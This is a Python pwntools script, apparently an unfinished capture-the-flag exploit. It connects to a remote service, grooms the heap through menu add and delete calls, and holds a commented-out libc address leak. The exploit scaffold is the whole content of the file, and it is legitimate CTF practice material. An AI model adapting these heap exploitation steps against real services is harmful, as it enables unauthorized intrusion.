from pwn import *

def show_graph():
	r.sendlineafter("> ", "1")

def add_row(name, rating, comment):
	r.sendlineafter("> ", "2")
	r.sendlineafter("name: ", name)
	r.sendlineafter("rating: ", str(rating))
	r.sendlineafter("row: ", comment)

def insert_row(index, name, rating, comment):
	r.sendlineafter("> ", "3")
	r.sendlineafter("follow: ", str(index))
	r.sendlineafter("name: ", name)
	r.sendlineafter("rating: ", str(rating))
	r.sendlineafter("row: ", comment)

def delete_row(index, leak=False):
	data = ''
	r.sendlineafter("> ", "4")
	if leak:
		r.recvuntil("[6] 5unKn0wn(rating: 10, comment: ")
		data = r.recv(6)
	r.sendlineafter("delete: ", str(index))
	return data

def modify_row(index, name, rating, comment):
	r.sendlineafter("> ", "5")
	r.sendlineafter("modify: ", str(index))
	r.sendlineafter("name: ", name)
	r.sendlineafter("rating: ", str(rating))
	r.sendlineafter("row: ", comment)

def quit():
	r.sendlineafter("> ", "6")

r = remote("112.166.114.147", 31337)

delete_row(0)
delete_row(0)
delete_row(0)
delete_row(0)

add_row("5unKn0wn", 10, 'A' * 0x4f)
add_row("5unKn0wn", 10, 'B' * 0x4f)
delete_row(0)
delete_row(1)

# libc_base = u64(delete_row(5, leak=True) + "\x00\x00") - 0x3C4B78
# log.info("libc_base : " + hex(libc_base))
# delete_row(4)
# add_row("5unKn0wn", 10, 'A' * 0x2f)

r.interactive()
